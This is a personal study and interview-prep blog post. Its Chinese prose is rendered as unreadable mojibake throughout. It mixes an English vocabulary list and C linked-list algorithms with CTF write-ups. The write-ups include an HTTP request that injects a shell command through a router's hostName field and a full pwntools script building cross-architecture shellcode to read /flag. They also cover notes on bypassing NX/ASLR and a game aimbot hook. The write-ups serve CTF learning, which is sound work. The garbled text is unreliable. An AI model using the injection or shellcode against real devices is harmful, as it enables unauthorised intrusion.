---
title: å„ç§è®ºæ–‡å’Œè®¡ç®—æœºç›¸å…³çš„è‹±æ–‡å•è¯
date: 2025-03-25 01:32:40 +0800
categories: 
tags: 
permalink: /posts/id=105/
pin: false
published:
---
```
malware æ¶æ„è½¯ä»¶
legacy æ—§çš„(é—äº§)
addressè§£å†³
capability èƒ½åŠ›
revert å¤åŸ
pseudo-code ä¼ªä»£ç 
Instrumentation ä»ªå™¨-ã€‹æ£€æµ‹æµ‹é‡
illustrates è¯´æ˜æ˜¾ç¤º
nested åµŒå¥—çš„
intuitive ç›´è§‚çš„
syntactical è¯­æ³•çš„
strip away å‰¥ç¦»
posing æå‡º
optimized ä¼˜åŒ–
millionç™¾ä¸‡ -> 100 m ä¸€äº¿
corpus è¯­æ–™
datasets æ•°æ®é›†
proven to è¢«è¯æ˜
incorporate åˆå¹¶
critical å…³é”®çš„
Experiments å®éªŒ
associated with ä¸ä»€ä¹ˆä»€ä¹ˆç›¸å…³
obfuscation æ··æ·†
potential æ½œåœ¨çš„å¯èƒ½çš„
Our findings æˆ‘ä»¬çš„ç ”ç©¶ç»“æœ
neither A nor B éƒ½ä¸
both and 
mitigating concerns ç¼“è§£æ‹…å¿§
intellectual property çŸ¥è¯†äº§æƒ
infringement ä¾µæƒ
distributed åˆ†æ•£
inference æ¨æ–­
benchmark åŸºå‡†
suite å¥—ä»¶
classifier åˆ†ç±»å™¨
columns åˆ—
implementation å®ç°
Embedding åµŒå…¥å‘é‡è¡¨ç¤º
Causal å› æœçš„ /è‡ªå›å½’
assignment to expression èµ‹å€¼ ç»™ è¡¨è¾¾å¼
```

## åŒæŒ‡é’ˆä¸é‡å¤é€’å¢å½’å¹¶(ä¸¤ä¸ªæœ‰åºé€’å¢é“¾è¡¨)
é¢˜ç›®ï¼šå°†ä¸¤ä¸ªé€’å¢çš„æœ‰åºé“¾è¡¨åˆå¹¶ä¸ºä¸€ä¸ªé€’å¢çš„æœ‰åºé“¾è¡¨ã€‚è¦æ±‚ç»“æœé“¾è¡¨ä»ä½¿ç”¨åŸæ¥ä¸¤ä¸ªé“¾è¡¨çš„å­˜å‚¨ç©ºé—´, ä¸å¦å¤–å ç”¨å…¶å®ƒçš„å­˜å‚¨ç©ºé—´ã€‚è¡¨ä¸­ä¸å…è®¸æœ‰é‡å¤çš„æ•°æ®

2ä¸ªæŒ‡é’ˆpa/pbä»å¤´å¼€å§‹éå†aã€b
æ¯”è¾ƒå¤§å°ï¼Œå°çš„çº³å…¥cä¸­ï¼š
aæ¯”bå°ï¼Œæ’å…¥aï¼Œaå‘å‰èµ°
aæ¯”bå¤§ï¼Œæ’å…¥bï¼Œbå‘å‰èµ°
aä¸bç›¸ç­‰ï¼Œæ’å…¥aï¼Œaå‘å‰èµ°ï¼Œåˆ é™¤bèŠ‚ç‚¹

ç”¨å°¾æ’æ³•æ¥ä¸ºcæ·»åŠ æ–°çš„èŠ‚ç‚¹
æœ€åå‰©ä¸‹çš„å…¨åŠ å…¥åˆ°cé“¾è¡¨é‡Œ

```c
void mergelist_norep(Linklist a, Linklist b){
    Linklist pa = a->next;
    Linklist pb = b->next;
    Linklist pc = a;
    Linklist q;

    while (pa && pb)
    {
        if (pa->data < pb->data){
            pc->next = pa; // tail insert 3step
            pc = pa;
            pa = pa->next;
        }
        else if (pa->data > pb->data)
        {
            pc->next = pb;
            pc = pb;
            pb = pb->next;
        }
        else if(pa->data == pb->data)
        {
            pc->next = pa;
            pc = pa;
            pa = pa->next;
            q = pb->next;
            free(pb);
            pb = q;
        }
    }
    pc->next = pa?pa:pb; // other one leave something
    free(b);

}

```


## åŒæŒ‡é’ˆé‡å¤é€’å¢å½’å¹¶é€’å‡(ä¸¤ä¸ªæœ‰åºé€’å¢é“¾è¡¨)
é¢˜ç›®ï¼šå°†ä¸¤ä¸ªéé€’å‡çš„æœ‰åºé“¾è¡¨åˆå¹¶ä¸ºä¸€ä¸ªéé€’å¢çš„æœ‰åºé“¾è¡¨ã€‚è¦æ±‚ç»“æœé“¾è¡¨ä»ä½¿ç”¨åŸæ¥ä¸¤ä¸ªé“¾è¡¨çš„å­˜å‚¨ç©ºé—´, ä¸å¦å¤–å ç”¨å…¶å®ƒçš„å­˜å‚¨ç©ºé—´ã€‚è¡¨ä¸­å…è®¸æœ‰é‡å¤çš„æ•°æ®ã€‚


åŸæœ¬æ˜¯æœ‰åºé€’å¢çš„ï¼Œæ‰€ä»¥å¤šä½™çš„éƒ¨åˆ†è¦æ³¨æ„å¤„ç†å€’åºï¼Œå³pa || pb 
å€’åºçš„å®ç°ç”¨å¤´æ’æ³•
åŒæŒ‡é’ˆå»èµ°aå’Œbï¼Œè°å°è°å¤´æ’ï¼Œè°ç©ºäº†å¯¹å®¶å…¨å¤´æ’

```c
void mergelist_reverse(Linklist a, Linklist b){
    Linklist pa = a->next; // æ‹·è´äº† a->next çš„æŒ‡é’ˆ
    Linklist pb = b->next;
    Linklist pc = a; 
    pc->next = NULL; // ç›¸å½“äºè¿™é‡ŒæŠŠAé“¾è¡¨çš„å¤´èŠ‚ç‚¹å’Œé¦–å…ƒèŠ‚ç‚¹æˆªæ–­äº†
    Linklist q;
    while (pa || pb)
    {
        if (!pa){//pa zero
            q = pb;
            pb = pb->next;
        }
        else if (!pb)
        {
            q = pa;
            pa = pa->next;
        }
        
        else if (pa->data <= pb->data)
        {
            q = pa;
            pa = pa->next;
        }
        else if (pa->data > pb->data)
        {
            q = pb;
            pb = pb->next;
        }
        q->next = pc->next;// head insert 2step by small size
        pc->next = q;
    }
    
    free(b);

}
```


## åŒæŒ‡é’ˆæ±‚äº¤é›†(ä¸¤ä¸ªæœ‰åºé€’å¢é“¾è¡¨)

å·²çŸ¥ä¸¤ä¸ªé“¾è¡¨Aå’ŒBåˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªé›†åˆï¼Œå…¶å…ƒç´ é€’å¢æ’åˆ—ã€‚è¯·è®¾è®¡ç®—æ³•æ±‚å‡ºAä¸Bçš„äº¤é›†ï¼Œå¹¶å­˜æ”¾äºAé“¾è¡¨ä¸­ã€‚

è¿˜æ˜¯åŒæŒ‡é’ˆå»å¤„ç†ï¼Œä¸€èµ·å¾€å‰èµ°ï¼Œç”¨å°¾æ’æ³•è®°å½•äº¤é›†
å¦‚æœç›¸ç­‰å°±çº³å…¥cä¸­ï¼ŒåŒæ—¶aå¾€å‰èµ°ï¼Œåˆ æ‰bçš„å…ƒç´ 
å¦‚æœä¸ç›¸ç­‰ï¼Œåˆ é™¤æ‰å°çš„é‚£ä¸ªï¼Œå› ä¸ºå°çš„é‚£ä¸ªæ„å‘³ç€ç‹¬æœ‰çš„

çŸ¥é“å…¶ä¸­ä¸€æ¡é“¾ä¸ºç©ºï¼Œåˆ™åˆ é™¤æ‰å¦ä¸€æ¡


```c
void mix(Linklist a, Linklist b){
    Linklist pa = a->next;
    Linklist pb = b->next;
    Linklist pc = a;
    Linklist u;
    while (pa && pb)
    {
        if (pa->data == pb->data){
            pc->next = pa;
            pc = pa;
            pa = pa->next;
            u = pb->next;
            free(pb);
            pb = u;
        }
        else if (pa->data > pb->data) // both is increase,so dele small one
        {
            u = pb->next;
            free(pb);
            pb = u;
        }
        else if (pa->data < pb->data)
        {
            u = pa->next;
            free(pa);
            pa = u;
        } 
    }
    // if anyone is empty, so dele another one

    while (pa)
    {
        u = pa->next;
        free(pa);
        pa = u;
    }
    while (pb)
    {
        u = pb->next;
        free(pb);
        pb = u;
    }
    pc->next = NULL;
    free(pb);
}
```

## åŒæŒ‡é’ˆæ±‚å·®é›†ï¼ˆä¸¤ä¸ªæœ‰åºé“¾è¡¨ï¼‰
ä¸¤ä¸ªæŒ‡é’ˆ pa/pb åŒæ—¶ä»å¤´å¼€å§‹éå† A å’Œ B
æ¯”è¾ƒå¤§å°ï¼šA å°å°±ä¿ç•™ï¼Œç­‰äºå°±è·³è¿‡ï¼ŒB å°å°±è®©å®ƒè¿½ä¸Š
A èµ°å®Œåå‰©ä¸‹çš„ç›´æ¥åŠ å…¥å·®é›†


## é¢è¯•é—®ç­”å‡†å¤‡
### ctf
+ ==åœ¨æ¯”èµ›ä¸­é‡åˆ°å°è±¡æ·±åˆ»çš„é¢˜ç›®ï¼Ÿ==

å¼ºç½‘æ¯çš„èµ›é¢˜ï¼Œ2022 å¹´çš„ä¸€é“totoxèµ›é¢˜ï¼Œéœ€è¦ç”¨ä¸‰ç§æ–¹å¼å»è·å–TOTOLINK x5000rçš„shellï¼Œå®ç°é¡µé¢åŠ«æŒï¼Œå›ºä»¶ç±»å‹æ˜¯cgibinè´Ÿè´£ä¸»è¦æœåŠ¡çš„æ–¹å¼ï¼Œé€šè¿‡websGetVarè·å–å‚æ•°ï¼Œå­˜åœ¨æœªæˆæƒçš„æ¥å£ï¼Œåœ¨setopmodeåŠŸèƒ½é‡Œ

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.3.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 90
Origin: http://192.168.3.2
Connection: close
Referer: http://192.168.3.2/advance/time.html?time=1679126798322
Cookie: SESSION_ID=2:1679122532:2


{
	"proto":"1",
	"hostName":"';echo yichen > /tmp/1.txt;' ",
	"topicurl":"setOpModeCfg"
}
```

è¿˜æœ‰2022å¹´çš„KOHèµ›é¢˜ï¼ŒMimicCodeï¼Œä¸€é“è·¨æ¶æ„shellcodeï¼Œç±»ä¼¼äºæ‹Ÿæ€çš„æ•ˆæœï¼Œè¿œç¨‹ä¼šè°ƒç”¨ç”¨ä¸åŒæ¶æ„çš„shellcodeæ‰§è¡Œç¨‹åºå»æ‰§è¡Œæˆ‘è¾“å…¥çš„shellcodeï¼Œå¯¹äºå¼‚æ¶æ„æ‰ç”¨qemuæ¨¡æ‹Ÿ

```shell
# ç¯å¢ƒé…ç½®
sudo apt install binutils-arm-linux-gnueabi
sudo apt install binutils-aarch64-linux-gnu
sudo apt install binutils-mips-linux-gnu

# MIPS å°ç«¯
sudo apt install binutils-mipsel-linux-gnu

# MIPS64 å¤§ç«¯
sudo apt install binutils-mips64-linux-gnuabi64

# MIPS64 å°ç«¯
sudo apt install binutils-mips64el-linux-gnuabi64
sudo apt install qemu-user qemu-user-static
```

å…¶ä¸­ä¸»è¦çš„éš¾ç‚¹å°±æ˜¯å¦‚æœåœ¨shellcodeæ‰§è¡Œçš„è¿‡ç¨‹ä¸­å»è¯†åˆ«åˆ°ä¸åŒçš„æ¶æ„ï¼Œæ¥æ‰§è¡Œå¯¹åº”æ¶æ„çš„shellcode
åœ¨ x86 ä¸‹ï¼Œæ®µå¯„å­˜å™¨cs=0x23ï¼Œèµ‹å€¼ç»™ebxï¼Œeax-ebx\==0ï¼Œä¸è·³ï¼Œæ‰§è¡Œ x32 shellcode
åœ¨ x64 ä¸‹ï¼Œæ®µå¯„å­˜å™¨cs=0x33ï¼Œèµ‹å€¼ç»™ebxï¼Œeax-ebx\==0x10ï¼Œè·³è½¬ï¼Œæ‰§è¡Œ x64 shellcode

è€Œarm/arm64/mips/mips64éƒ½æ˜¯å®šé•¿æŒ‡ä»¤é›†ï¼Œæ¯æ¡æŒ‡ä»¤å››å­—èŠ‚ï¼Œä»–ä»¬çš„å…¼å®¹æ€§ä¸»è¦è€ƒè™‘ä¸ºæŸäº›æŒ‡ä»¤è¯­å¥çš„å…¼å®¹æ€§
åƒæ˜¯armçš„åŒºåˆ†åœ¨äºï¼Œarmæ¶æ„çš„bæŒ‡ä»¤å¯¹äºå…¶ä»–æ¶æ„å…¼å®¹æ€§æ¯”è¾ƒå¼ºï¼Œå…¶ä»–æ¶æ„è¯†åˆ«å®ƒå¸¸è¢«è¯†åˆ«ä¸ºå¯„å­˜å™¨çš„åŠ å‡ï¼Œæ‰€ä»¥å¯ä»¥åœ¨shellcodeå¼€å§‹æ—¶å¸ƒç½®ï¼Œè·³è½¬åˆ°shellcodeå°¾éƒ¨å¸ƒç½®çš„armæ¶æ„shellcode
è€Œarm64ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨æ„é€ è·³è½¬ï¼Œåªè¦ç­‰å¾…å‰é¢çš„è·³è½¬æŒ‡ä»¤éƒ½æœªè¢«è¯†åˆ«å¤±è´¥å°±å¯ä»¥è·³è½¬åˆ°arm64çš„shellcode
è¿™é‡Œqemu-armå¯¹äºä¸€äº›é”™è¯¯çš„æŒ‡ä»¤å°½ç®¡æ— æ³•è¯†åˆ«ï¼Œä½†æ˜¯ä¸ä¼šå´©æºƒï¼Œè€Œæ˜¯è½¬è€Œæ‰§è¡Œä¸‹ä¸€æ¡æœ‰æ•ˆæŒ‡ä»¤
(2c0000ea ea 00002c 	0x2c << 2 = 0xb8 åœ¨armé‡Œå°±æ˜¯+0xb8ï¼Œb8å°±ç®—æŠ¥é”™ä¹Ÿå¯ä»¥ç»§ç»­æ‰§è¡Œ)
å†è€…å°±æ˜¯
mipsçš„åŒºåˆ†ï¼Œéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯mipsä¸ºå¤§ç«¯åº(åœ¨å†™shellcodeæ—¶é¡ºåºä¸ä¸€æ ·)
mipsçš„ç¨‹åºæ˜¯é»˜è®¤ä¸å¼€å¯pieçš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ˜¯åœ¨æ‰§è¡Œshellcodeæ—¶ä¼šraå¯„å­˜å™¨ä¼šè®°å½•è¿”å›åœ°å€çš„å€¼(0x40054C)ï¼Œè¿™æ˜¯ä¸€ä¸ªé™æ€åœ°å€ï¼Œå¯ä»¥å¯¹å®ƒè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ ¡éªŒä¸æ˜¯é‚£å°±åˆ¤æ–­ä¸ºmips64 

ç„¶åå°±æ˜¯shellcodeæ„é€ æ€è·¯å°±æ˜¯æ‰“å¼€ /flag å¹¶æ‰“å°å†…å®¹ï¼Œä½¿ç”¨2ä¸ªç³»ç»Ÿè°ƒç”¨open/64ä½ä¸‹æ˜¯openatå’Œsendfileæ¥èŠ‚çœé•¿åº¦
ä¸åŒæ¶æ„çš„ç³»ç»Ÿè°ƒç”¨è§¦å‘æŒ‡ä»¤ä¸ä¸€æ ·x86æ˜¯int 0x80ï¼Œx64æ˜¯syscallï¼Œarmæ˜¯svc 0ï¼Œå…¶ä¸­r7å¯„å­˜å™¨å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·ï¼Œarm64æ˜¯svc0ï¼Œå…¶ä¸­x8åšç³»ç»Ÿè°ƒç”¨å·ï¼Œmipså’Œmips64æ˜¯ä½¿ç”¨syscall 0x40404ï¼Œv0åšç³»ç»Ÿè°ƒç”¨å·

æœ€åæ„é€ å°±æ˜¯ arm bè·³è½¬+mips/mips64 blezç›¸å¯¹è·³è½¬+x86/x64 jmpè·³è½¬ + arm64_shellcode + x86/x64_shellcode + arm_shellcode + mips/mips64_shellcode

åç»­å¯ä»¥ä¼˜åŒ–çš„åœ°æ–¹ä¸»è¦æ˜¯ï¼Œå¯¹äºx86ï¼Œå¯ä»¥è¿›ä¸€æ­¥ä½¿ç”¨çŸ­æŒ‡ä»¤ï¼Œæ‹†åˆ†å¯„å­˜å™¨ï¼Œæ¯”å¦‚æŠŠeaxæ‹†åˆ†æˆalï¼Œretfq ä»0x23è·³åˆ°0x33


```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-hp','64']
def compile_x86(sc):
    r = asm(sc,arch='i386')
    print(r)
    f = open('86.bin','wb').write(r)
    return r

def decompile_x86(sc):
    r = disasm(sc,arch='i386')
    print(r)
    return r

def compile_x64(sc):
    r = asm(sc,arch='amd64')
    print(r)
    return r

def decompile_x64(sc):
    r = disasm(sc,arch='amd64')
    print(r)
    return r

def compile_arm(sc):
    r = asm(sc,arch='arm')
    print(r)
    return r

def compile_thumb(sc):
    r = asm(sc,arch='thumb')
    print(r)
    return r

def compile_arm64(sc):
    r = asm(sc,arch='aarch64')
    print(r)
    return r

def compile_mips(sc):
    r = asm(sc,arch='mips',endian='big')
    print(r)
    return r

x86_x64_jmp = compile_x86('''
mov eax,cs
mov ebx,0x23
sub eax,ebx
jnz x64
x32:
    mov ebx, 0x67
    push ebx
    mov ebx, 0x616c662f
    push ebx
    mov eax, 5
    mov ebx, esp
    xor ecx, ecx
    int 0x80
    mov ebx, 1
    mov ecx, eax
    xor edx, edx
    mov esi, 1000
    mov eax, 0xbb
    int 0x80
x64:                                     
''')# open sendfile(1, fd, NULL, 1000); eax=0xbb

x64_sc = compile_x64('''
    mov rbx, 0x67616c662f
    push rbx
    mov rax, 2
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 1000
    mov rax, 40
    syscall
''')# open sendfile(1, fd, NULL, 1000);40

arm_sc = compile_arm('''
    adr  r0, flag
    eor  r1, r1
    eor  r2, r2
    mov  r7, #5
    svc  0
    mov  r1, r0
    mov  r0, #1
    eor  r2, r2
    mov  r3, #100
    mov  r7, #0xbb
    svc  0
flag:
	.ascii "/flag"              
''')# r7 svc  r0/r1/r2

arm64_sc = compile_arm64('''
    adr  x1, flag
    mov  x2, #0
    mov  x0, x2
    mov  x8, #56
    svc 0
    /* call sendfile(1, 'x0', 0, 0x7fffffff) */
    mov  x1, x0
    mov  x0, #1
    mov  x2, #0
    mov  x3, 100
    mov  x8, #SYS_sendfile
    svc 0
flag:
	.asciz "/flag" 
''')

mips_sc = compile_mips('''
    li  $t1, 0x2f666c61
    sw  $t1, ($sp)
    lui $t9, 0x6700
    sw $t9, 4($sp)
    
    li $t1,0xfa5
    li $t2,0x106f
    
    li $t6,0x40054c
    beq $ra,$t6,main
    nop
    li $t1,0x138a
    li $t2,0x13af
    
    main:
    move $a0,$sp
    li $a1,0
    li $a2,0
    move $v0, $t1
    syscall 0x40404

    li $a0, 1
    move $a1, $v0
    li $a3, 100
    move $v0, $t2
    syscall 0x40404
''')

#io = process("./ShellcodeRunnerX86")
#gdb.attach(io,"b * 0x080497B3")

# io = process("./ShellcodeRunnerX64")
# gdb.attach(io,"b * 0x401717")

# io = process(["/bin/sh",'-c','qemu-arm ./ShellcodeRunnerARM32'])
# io = process(["/bin/sh",'-c','qemu-arm -g 1234 ./ShellcodeRunnerARM32'])
# gdb.attach(io,"b * 0x10614")

#io = process(["/bin/sh",'-c','qemu-aarch64 ./ShellcodeRunnerARM64'])
# io = process(["/bin/sh",'-c','qemu-aarch64 -g 1234 ./ShellcodeRunnerARM64'])
#b * 0x400768

#io = process(["/bin/sh",'-c','qemu-mips ./ShellcodeRunnerMIPS'])
io = process(["/bin/sh",'-c','qemu-mips -g 1234 ./ShellcodeRunnerMIPS'])
#b * 0x400544

# io = process(["/bin/sh",'-c','qemu-mips64 ./ShellcodeRunnerMIPS64'])
#io = process(["/bin/sh",'-c','qemu-mips64 -g 1234 ./ShellcodeRunnerMIPS64'])
#b * 120004088

thumb_jmp = compile_arm('''
    add    r2, pc, #1
    bx     r2                        
''')

arm_jmp   = bytes.fromhex('2c0000ea') # b 0x2c arm64
jmp_0x36_x86_x64 = bytes.fromhex('eb34001c') # jmp 0x36

#    2273ff9c        addi    s3, s3, -100
#    1a600050        blez    s3, 0x144
#    2273ff9c        addi    s3, s3, -100 !!! nop
#    2273ff9c        addi    s3, s3, -100 !!! nop

mips_jmp = bytes.fromhex('2273ff9c1a6000512273ff9c2273ff9c')
#mips_jmp = bytes.fromhex('1ae0003b')


test = arm_jmp + mips_jmp + jmp_0x36_x86_x64 + arm64_sc + x86_x64_jmp + x64_sc
test = test.ljust(0xbc,b'a') # len: 0xbc
test += arm_sc               # len: 0xf0  arm_sc : 52
test += mips_sc              # len: 0x134 mips_sc: 68

#print(disasm(mips_sc,arch='mips',endian='big'))

#test = test.ljust(0x150,b'a')
test += bytes.fromhex('18000000') # bug

#  0:   1800ffea        blez    zero, 0xffffffac
#  mips jump back
test += bytes.fromhex('1800ffe7')

print(len(test))
print((test).hex())
print(pow(0x1000/len(test),6))



io.recvuntil(b"Shellcode >")
io.send(test)
io.interactive()
```

è¿˜æœ‰2023å¹´å¼ºç½‘æ¯

teeworlds æ˜¯ä¸€ä¸ªå°„å‡»å’Œå¤ºæ——çš„å¼€æºCè¯­è¨€æ¸¸æˆï¼ŒåŸºæœ¬çš„é€»è¾‘ä¸Šå°±æ˜¯å†™ä¸€ä¸ªhookå‡½æ•°ï¼Œå»å®ç°è‡ªåŠ¨ç„å‡†
ä¸»è¦çš„æ€è·¯æ˜¯å…ˆå»æ‰¾è§’è‰²çš„ç§»åŠ¨ï¼Œå› ä¸ºæŒ‰é”®è¾“å…¥æ–¹å‘ä»¥åï¼Œæ¸¸æˆè¦è¯†åˆ«å¯¹åº”çš„æ–¹å‘ï¼Œå¯ä»¥å†™ä¸€ä¸ªhookå‡½æ•°ï¼Œprintå‡ºæ¯æ¬¡è¾“å…¥çš„ç»“æœï¼Œè¿™é‡Œé¢è¿˜åŒ…æ‹¬äº†ç‚¹å‡»å­å¼¹çš„æ“ä½œ
æ‰¾åˆ°å®ƒå¼€æªæ–¹å‘çš„å¤„ç†å‡½æ•°ï¼Œé€šè¿‡æ¸¸æˆæœ¬èº«çš„æ¥å£å‡½æ•°è·å–æ•Œäººçš„åæ ‡ï¼Œç„¶åä¼ å…¥å¼€æªæ–¹å‘çš„å‡½æ•°é‡Œå°±èƒ½å®ç°ç®€å•çš„è‡ªåŠ¨ç„å‡†äº†



+ ==å…³äºarm/mipsç­‰æŒ‡ä»¤é›†ï¼Ÿ==

mipsæ˜¯å¤§ç«¯åºï¼Œå®šé•¿æŒ‡ä»¤ï¼Œâ—ä¸ç®¡è·³ä¸è·³ï¼Œbeq ä¹‹åé‚£ä¸€æ¡æŒ‡ä»¤ï¼ˆå»¶è¿Ÿæ§½ï¼‰æ€»ä¼šæ‰§è¡Œï¼

lw è½½å…¥ ä»å³å¾€å·¦å­˜å‚¨
sw å­˜å‚¨ ä»å·¦å¾€å³å­˜å‚¨
lui è½½å…¥é«˜ä½ç«‹å³æ•° ä¸€èˆ¬æ˜¯0x1235 å³16ä½2å­—èŠ‚ï¼Œä½2å­—èŠ‚è‡ªåŠ¨è¡¥0
ori è½½å…¥ä½16ä½
li è½½å…¥ç«‹å³æ•°
la è½½å…¥å­—ç¬¦ä¸²
move
sll é€»è¾‘å·¦ç§»
srl é€»è¾‘å³ç§»
beq b eq ç›¸ç­‰è·³è½¬ 
bne b not eq ä¸ç›¸ç­‰è·³è½¬
blez b little eq zero å¦‚æœå·¦è¾¹å°äº0å°±è·³è½¬
slt small lt å°äºç½®ä½ slt $t0 $t1 $t2 å°±æ˜¯åˆ¤æ–­t1å’Œt2 
slti small lt i

j
jr 
jal è·³è½¬å¹¶è¿æ¥ jal func è·³è½¬åˆ°funcï¼Œè¿”å›åœ°å€å­˜æ”¾åˆ°$ra
jalr è·³è½¬å¯„å­˜å™¨
å‚æ•°ä¼ é€’æ—¶ a0-a3 å¤šçš„ç”¨æ ˆä¼ é€’ $raå­˜æ”¾è¿”å›çš„åœ°å€é€šå¸¸å’Œjalè”åŠ¨ï¼Œè¿”å›å€¼ç”¨v0-v1å­˜æ”¾ï¼Œç³»ç»Ÿè°ƒç”¨å·ä¹Ÿç”¨v0
ä¸»è¦å¯„å­˜å™¨æ˜¯a  s t 
 
---------------------------------------------------------------------------------------------------
æ‹“å±•armæ±‡ç¼–ï¼š
å®šé•¿ 32 ä½

å‚æ•°ä¼ é€’åŒæ ·æ˜¯r0-r3ï¼Œå…¶ä½™ç”¨stackä¼ é€’ï¼Œç„¶ç»˜åˆ¶é€šå¸¸æ˜¯r0-r1
lr link register ä¿å­˜è¿”å›åœ°å€ ç±»ä¼¼$ra
ç³»ç»Ÿè°ƒç”¨å·æ˜¯r7
arch64å°±æ˜¯rå˜æˆx

ldr åŠ è½½æŒ‡ä»¤ 
str å­˜å‚¨æŒ‡ä»¤
adr åŠ è½½ç›¸å¯¹æŒ‡ä»¤ 
movw åŠ è½½ä½16ä½
movt åŠ è½½é«˜16ä½

b ç›¸å¯¹åç§»è·³è½¬
bl è¿”å›åœ°å€å­˜æ”¾åˆ°lr
bx è¿”å›åˆ°lr
beq å…³é”®åœ¨äºå®ƒæ˜¯åˆ¤æ–­zfå¯„å­˜å™¨çš„ï¼Œå¦‚æœä¸º1åˆ™è·³è½¬
bne
bgt å¤§äºè·³è½¬
blt å°äºè·³è½¬
bal awaysè·³è½¬
blx <\reg>è·³è½¬å¹¶åˆ‡æ¢çŠ¶æ€
å¦‚æœ <\reg> çš„å€¼æ˜¯å¥‡æ•° â†’ åˆ‡æ¢åˆ° Thumb æ¨¡å¼
å¦‚æœæ˜¯å¶æ•° â†’ ä¿æŒæˆ–åˆ‡æ¢å› ARM æ¨¡å¼

Thumb æ¨¡å¼æ˜¯â€œè½»é‡ ARMâ€
ç‰¹æ€§	ARM æ¨¡å¼ï¼ˆA32ï¼‰	Thumb æ¨¡å¼ï¼ˆT32 / Thumb-1ï¼‰
æŒ‡ä»¤å®½åº¦	å…¨æ˜¯ 32 ä½æŒ‡ä»¤	å¤šä¸º 16 ä½ï¼ˆThumb-1ï¼‰/ 16+32 ä½ï¼ˆThumb-2ï¼‰
æ€§èƒ½	æŒ‡ä»¤ä¸°å¯Œï¼Œé€Ÿåº¦æ›´å¿«	æŒ‡ä»¤ç²¾ç®€ï¼Œå å†…å­˜æ›´å°‘
äºŒè¿›åˆ¶å¤§å°	å¤§	å°ï¼ˆé€‚åˆåµŒå…¥å¼ï¼‰
å¯æ‰§è¡Œå¹³å°	é€šå¸¸ç”¨åœ¨æ€§èƒ½æ›´é«˜å¹³å°	å¸¸ç”¨äº MCUã€åµŒå…¥å¼ã€æ‰‹æœºå¹³å°
åˆ‡æ¢æ–¹å¼	bx æˆ– blx æŒ‡ä»¤åˆ‡æ¢	ä¸ ARM æ¨¡å¼äº’ç›¸åˆ‡æ¢


+ ==è¡¥å¤©æ¯ç ´è§£å¤§èµ›è¿™ä¸ªå¯ä»¥è¯¦ç»†è¯´è¯´å—ï¼Ÿ==

TL-WPA7510 ACå¥—ä»¶
adminæ¥å£è®¾ç½®è¯­è¨€çš„æ—¶å€™å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œç¼ºå°‘é‰´æƒ


+ ==windows/linuxåŸºæœ¬ä¿æŠ¤æœºåˆ¶ï¼ˆæ ˆæ‰§è¡Œä¿æŠ¤ï¼ŒåŸºå€éšæœºåŒ–ï¼Œä»£ç æ®µéšæœºåŒ–ï¼Œæ ˆæº¢å‡ºä¿æŠ¤ï¼‰æ€ä¹ˆç»•è¿‡ï¼Ÿ==
NX/DEP:ROP
ASLR: æ³„éœ²åœ°å€(got/libc)ï¼ŒPIEæ³„éœ²åŸºåœ°å€ï¼Œçˆ†ç ´æ”»å‡»



+ ==ç»™ä½ ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå¼€äº†PIEçš„æƒ…å†µä¸‹ï¼Œä½ æ€ä¹ˆè·å–shell==
æ³„éœ²ç¨‹åºåŸºåœ°å€æˆ–è€…çˆ†ç ´


+ ==æ¯”èµ›é‡Œæ‹…ä»»æ€æ ·çš„è§’è‰²ï¼Œå°è±¡æ·±åˆ»çš„ä¸€åœºæ¯”èµ›ï¼Œé‡åˆ°çš„èµ›é¢˜ï¼Œè¾“å‡ºå æ¯”==
ä¸»è¦æ˜¯å¤„ç†pwnæ–¹å‘çš„é¢˜ç›®ï¼Œ(é¢˜ç›®å°±è¯´å¼ºç½‘æ¯)ï¼Œè¾“å‡ºå æ¯”1/4

+ ==æœ€è¿‘æ¯”èµ›é‡Œæ¯”è¾ƒå°è±¡æ·±åˆ»çš„é¢˜ç›®==
Hexagon æ¶æ„çš„é¢˜ç›®ï¼Œ32ä½ï¼Œç”¨qemuå»å¯åŠ¨ï¼Œç±»ä¼¼äºARMæ¶æ„ç”¨Rå¯„å­˜å™¨ï¼Œå°±æ˜¯ä¸€ä¸ª4å­—èŠ‚æº¢å‡ºï¼Œå¯ä»¥ç”¨qemuçš„è°ƒè¯•æ—¥å¿—åŠŸèƒ½è¿›è¡Œæ—¥å¿—è°ƒè¯•ï¼Œæ„é€ æ ˆè¿ç§»å³å¯è·å–shell

+ ==æ¡ä»¶ç«äº‰æ¼æ´==
æ¯”å¦‚ç°åœ¨æœ‰ä¸€ä¸ªç¨‹åºï¼ŒåŠŸèƒ½æ˜¯æ£€æŸ¥ä¸€ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±åˆ›å»ºå†™å…¥å†…å®¹ï¼Œè€Œå¦ä¸€ä¸ªä¹Ÿåœ¨åŒæ—¶æ‰§è¡Œï¼Œå°±ä¼šé€ æˆè¦†å†™
### iot

+ ==è°ˆä¸€è°ˆæ€ä¹ˆæŒ–æ˜æœªæˆæƒçš„è·¯ç”±å™¨æ¼æ´==
1.æ”¶é›†è·¯ç”±å™¨çš„æ¥å£ï¼Œå°è¯•è®¿é—®ï¼Œçœ‹æ˜¯å¦å­˜åœ¨åå°é¡µé¢å¯æœªæˆæƒè®¿é—®
2.æŸ¥çœ‹è·¯ç”±å™¨çš„é…ç½®æ–‡ä»¶å’Œä¸€äº›ç›¸å…³äº§å“çš„å†å²æ¼æ´ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ç›´æ¥æš´éœ²å¯†ç çš„é€»è¾‘
